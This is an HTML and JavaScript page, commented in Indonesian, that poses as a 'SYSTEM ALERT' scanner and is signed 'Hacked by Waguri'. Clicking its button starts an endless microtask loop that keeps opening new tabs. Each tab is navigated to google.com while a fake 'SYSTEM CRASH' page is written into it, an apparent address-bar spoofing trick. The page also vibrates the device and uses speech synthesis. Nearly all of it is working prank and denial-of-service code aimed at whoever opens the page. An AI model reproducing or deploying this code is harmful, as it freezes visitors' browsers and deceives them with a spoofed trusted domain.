<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>204 No Content Spoofing</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; text-align: center; border: 1px solid #333; }
h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
button { width: 100%; padding: 18px; cursor: pointer; border: none; border-radius: 8px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); transition: background 0.2s; }
button:hover { background: #b71c1c; }
button:disabled { background: #555; cursor: not-allowed; }
#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
    <h1>⚠️ SYSTEM ALERT</h1>
    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (204 No Content Exploit).</p>
    
    <button id="start-btn" type="button">Mulai Pemindaian</button>
    
    <div id="status" role="status">Menunggu interaksi...</div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

let isProcessing = false;

function efekHacker() {
    if (navigator.vibrate) {
        navigator.vibrate([1000, 200, 1000, 200, 1000]);
    }
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance('Hacked by Waguri');
        utterance.lang = 'en-US';
        utterance.rate = 0.9;
        window.speechSynthesis.speak(utterance);
    }
}

startBtn.addEventListener("click", function() {
    if (isProcessing) return;
    isProcessing = true;
    startBtn.disabled = true;
    startBtn.textContent = "Sistem Terkunci...";

    efekHacker();

    let dipicu = 0;
    statusDiv.textContent = "Memicu 204 No Content Exploit...";

    function picuTerusMenerus() {
        dipicu++;
        try {
            // 1. Buka tab kosong
            const w = window.open('about:blank', '_blank');
            
            if (w) {
                try {
                    // 2. Navigasi ke URL target (google.com) 
                    w.location.href = 'https://google.com';
                    
                    // 3. RACE CONDITION: Suntikkan konten saat navigasi masih berjalan
                    // Kita gunakan queueMicrotask untuk eksekusi secepat mungkin
                    let count = 0;
                    let intv = setInterval(function() {
                        count++;
                        try {
                            // Trik: Tulis konten seolah-olah itu adalah respons 204
                            if (w.document) {
                                w.document.open();
                                w.document.write(`
                                    <!DOCTYPE html>
                                    <html>
                                    <head><title>Google</title></head>
                                    <body style="margin:0;padding:0;background:#000;color:#f00;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;text-align:center;">
                                        <div>
                                            <h1 style="font-size:60px; text-shadow:0 0 20px #f00;">SYSTEM CRASH</h1>
                                            <p style="color:#0f0; font-size:20px;">Hacked by Waguri</p>
                                            <p style="color:#ff0; font-size:12px; margin-top:20px;">204 No Content Spoofing</p>
                                            <p style="color:#aaa; font-size:10px; margin-top:10px;">Address Bar says: google.com</p>
                                        </div>
                                    </body>
                                    </html>
                                `);
                                w.document.close();
                            }
                        } catch(e) {}
                        
                        // Hentikan setelah 2 detik
                        if (count > 20) { clearInterval(intv); }
                    }, 50); // Eksekusi setiap 50ms selama browser memuat
                    
                    // 4. Trigger Race Condition Anak
                    setTimeout(function() {
                        try {
                            const wAnak = window.open('about:blank', '_blank');
                            if (wAnak) {
                                wAnak.location.href = 'https://google.com';
                                // Suntikkan konten juga ke tab anak
                                wAnak.document.write('<h1 style="color:red;font-family:monospace;text-align:center;margin-top:20%">SYSTEM CRASH</h1>');
                                wAnak.document.close();
                            }
                        } catch(e) {}
                    }, 1000);
                    
                } catch(e) {}
            }
            statusDiv.textContent = `Membuka tab spoofing ke-${dipicu}...`;
        } catch(e) {}

        queueMicrotask(picuTerusMenerus);
    }

    queueMicrotask(function() {
        queueMicrotask(function() {
            picuTerusMenerus();
        });
    });
});
</script>
</body>
</html>
